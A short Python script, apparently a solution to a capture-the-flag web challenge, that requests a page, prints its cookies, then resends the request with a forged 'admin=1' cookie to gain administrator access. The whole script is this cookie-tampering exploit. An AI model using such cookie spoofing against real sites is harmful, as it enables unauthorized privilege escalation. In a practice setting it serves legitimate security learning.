#!/usr/bin/env python

import requests

URL = 'http://hack.bckdr.in/CKK/index.php'

def main():
	r = requests.get(URL)
	if r.status_code != 200:
		print('Failed: %d' % r.status_code)
		return

	# print the text
	print('HTML:\n%s' % r.text)

	# print the cookies
	cookie = r.cookies
	print('Cookies:\n%s' % cookie)

	spoofed_cookie = dict(admin='1')
	r = requests.get(URL, cookies=spoofed_cookie)
	print(r.text)
	print(r.cookies)


if __name__ == "__main__":
	main()
